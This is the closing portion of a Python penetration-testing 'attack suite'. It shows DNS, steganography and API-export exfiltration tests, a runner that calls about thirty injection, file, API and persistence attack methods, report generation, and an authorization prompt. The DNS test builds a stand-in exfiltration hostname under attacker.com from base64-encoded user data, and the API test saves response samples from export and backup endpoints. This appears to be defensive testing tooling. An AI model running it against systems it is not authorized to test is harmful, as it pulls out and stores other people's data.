    # ============================================================================
    # 12. ADVANCED DATA EXFILTRATION
    # ============================================================================
    
    def dns_exfiltration(self):
        """Test DNS exfiltration"""
        logger.info("🔍 Testing DNS Exfiltration...")
        
        # Simulate DNS exfiltration
        try:
            # Get sensitive data
            response = self.session.get(f"{self.target_url}/api/users")
            
            if response.status_code == 200:
                data = response.text[:50]
                # Encode in subdomain
                encoded = base64.b64encode(data.encode()).decode()[:63]
                
                # In real attack, this would query: encoded.attacker.com
                logger.info(f"DNS exfiltration payload: {encoded}.attacker.com")
                
                self.add_vulnerability(
                    'DNS Exfiltration Possible',
                    'HIGH',
                    'Application allows DNS queries that could be used for exfiltration'
                )
        
        except Exception as e:
            logger.debug(f"DNS exfiltration test failed: {e}")
    
    def steganography_exfiltration(self):
        """Test data hiding in images"""
        logger.info("🔍 Testing Steganography-based Exfiltration...")
        
        # In a real attack, sensitive data would be hidden in image pixels
        logger.info("Steganography: Data could be hidden in uploaded images")
        
        self.add_vulnerability(
            'Steganography Exfiltration Risk',
            'LOW',
            'File uploads could be used for steganography-based exfiltration'
        )
    
    def api_legitimate_exfiltration(self):
        """Exfiltrate data via legitimate APIs"""
        logger.info("🔍 Testing Exfiltration via Legitimate APIs...")
        
        # Use legitimate endpoints to exfiltrate data
        legitimate_endpoints = [
            '/api/export',
            '/api/download',
            '/api/report',
            '/api/backup',
        ]
        
        for endpoint in legitimate_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")
                
                if response.status_code == 200 and len(response.content) > 0:
                    self.add_vulnerability(
                        'Data Exfiltration via Legitimate API',
                        'MEDIUM',
                        f'Data can be exfiltrated via: {endpoint}',
                        f'Size: {len(response.content)} bytes'
                    )
                    self.save_exfiltrated_data('api_exfiltration', {
                        'endpoint': endpoint,
                        'size': len(response.content),
                        'sample': response.text[:200]
                    })
            
            except Exception as e:
                logger.debug(f"API exfiltration test failed: {e}")
    
    # ============================================================================
    # MAIN ATTACK EXECUTION
    # ============================================================================
    
    def run_all_attacks(self):
        """Execute all attack vectors"""
        logger.info("=" * 80)
        logger.info("🚨 STARTING COMPREHENSIVE SECURITY ATTACK SUITE 🚨")
        logger.info("=" * 80)
        
        attack_categories = [
            ("INJECTION ATTACKS", [
                self.sql_injection_attacks,
                self.nosql_injection_attacks,
                self.command_injection_attacks,
                self.ldap_injection_attacks,
                self.xpath_injection_attacks,
            ]),
            ("DATA EXPOSURE & LEAKAGE", [
                self.sensitive_data_exposure,
                self.information_disclosure,
                self.insecure_data_storage,
            ]),
            ("DATA MANIPULATION", [
                self.parameter_tampering,
                self.mass_assignment,
                self.race_condition,
                self.business_logic_abuse,
            ]),
            ("FILE ATTACKS", [
                self.file_upload_vulnerability,
                self.path_traversal,
                self.local_file_inclusion,
                self.remote_file_inclusion,
            ]),
            ("SERIALIZATION ATTACKS", [
                self.insecure_deserialization,
            ]),
            ("ATTACK CHAINING", [
                self.attack_chain_information_to_access,
            ]),
            ("ADVANCED INJECTIONS", [
                self.blind_sql_injection,
                self.second_order_injection,
                self.polyglot_injection,
            ]),
            ("API ATTACKS", [
                self.excessive_data_exposure,
                self.bola_attack,
                self.graphql_abuse,
            ]),
            ("SUPPLY CHAIN", [
                self.dependency_vulnerability_check,
            ]),
            ("LOW & SLOW ATTACKS", [
                self.slow_data_exfiltration,
                self.rate_limit_bypass,
            ]),
            ("PERSISTENCE ATTACKS", [
                self.webshell_detection,
                self.backdoor_functionality_abuse,
            ]),
            ("ADVANCED EXFILTRATION", [
                self.dns_exfiltration,
                self.steganography_exfiltration,
                self.api_legitimate_exfiltration,
            ]),
        ]
        
        for category_name, attacks in attack_categories:
            logger.info(f"\n{'='*80}")
            logger.info(f"📍 CATEGORY: {category_name}")
            logger.info(f"{'='*80}")
            
            for attack in attacks:
                try:
                    attack()
                    time.sleep(0.5)  # Small delay between attacks
                except Exception as e:
                    logger.error(f"❌ Attack failed: {attack.__name__} - {e}")
        
        # Generate final report
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive attack report"""
        logger.info("\n" + "="*80)
        logger.info("📊 GENERATING ATTACK REPORT")
        logger.info("="*80)
        
        # Save results to JSON
        report_file = os.path.join(
            REPORT_DIR,
            f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # Generate summary
        total_vulns = len(self.results['vulnerabilities'])
        critical = sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'CRITICAL')
        high = sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'HIGH')
        medium = sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'MEDIUM')
        low = sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'LOW')
        
        summary = f"""
        
╔══════════════════════════════════════════════════════════════════════════════╗
║                          ATTACK SUMMARY REPORT                               ║
╚══════════════════════════════════════════════════════════════════════════════╝

Target: {self.target_url}
Scan Time: {self.results['timestamp']}

VULNERABILITIES DISCOVERED:
├─ Total: {total_vulns}
├─ 🔴 Critical: {critical}
├─ 🟠 High: {high}
├─ 🟡 Medium: {medium}
└─ 🟢 Low: {low}

DATA EXFILTRATION:
└─ Files exfiltrated: {len(self.results['exfiltrated_data'])}

DETAILED REPORT: {report_file}
EXFILTRATED DATA: {EXFILTRATION_DIR}

╔══════════════════════════════════════════════════════════════════════════════╗
║                     TOP CRITICAL VULNERABILITIES                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        
        # List top critical vulnerabilities
        critical_vulns = [v for v in self.results['vulnerabilities'] if v['severity'] == 'CRITICAL']
        for i, vuln in enumerate(critical_vulns[:10], 1):
            summary += f"\n{i}. [{vuln['category']}] {vuln['description'][:80]}"
        
        summary += "\n\n" + "="*80 + "\n"
        
        print(summary)
        logger.info(f"✅ Full report saved to: {report_file}")
        logger.info(f"✅ Exfiltrated data in: {EXFILTRATION_DIR}")


def main():
    """Main execution function"""
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                   AUTOMATED SECURITY ATTACK SUITE                            ║
    ║                                                                              ║
    ║  ⚠️  WARNING: USE ONLY ON YOUR OWN APPLICATIONS                             ║
    ║  ⚠️  UNAUTHORIZED TESTING IS ILLEGAL                                        ║
    ║                                                                              ║
    ║  This tool performs comprehensive penetration testing including:            ║
    ║  • SQL/NoSQL/Command/LDAP/XPath Injection                                   ║
    ║  • Data Exposure & Leakage                                                  ║
    ║  • Parameter Tampering & Mass Assignment                                    ║
    ║  • File Upload & Path Traversal                                             ║
    ║  • Serialization Attacks                                                    ║
    ║  • API Vulnerabilities (BOLA, GraphQL)                                      ║
    ║  • Attack Chaining                                                          ║
    ║  • Data Exfiltration                                                        ║
    ║  • And much more...                                                         ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # Confirmation
    print(f"\n🎯 Target: {TARGET_URL}")
    confirmation = input("\n⚠️  Are you authorized to test this application? (yes/no): ")
    
    if confirmation.lower() != 'yes':
        print("❌ Attack cancelled.")
        return
    
    # Initialize scanner
    scanner = VulnerabilityScanner(TARGET_URL)
    
    # Run all attacks
    scanner.run_all_attacks()
    
    print("\n✅ Attack suite completed!")
    print(f"📁 Check reports in: {REPORT_DIR}")
    print(f"📁 Check exfiltrated data in: {EXFILTRATION_DIR}")


if __name__ == "__main__":
    main()
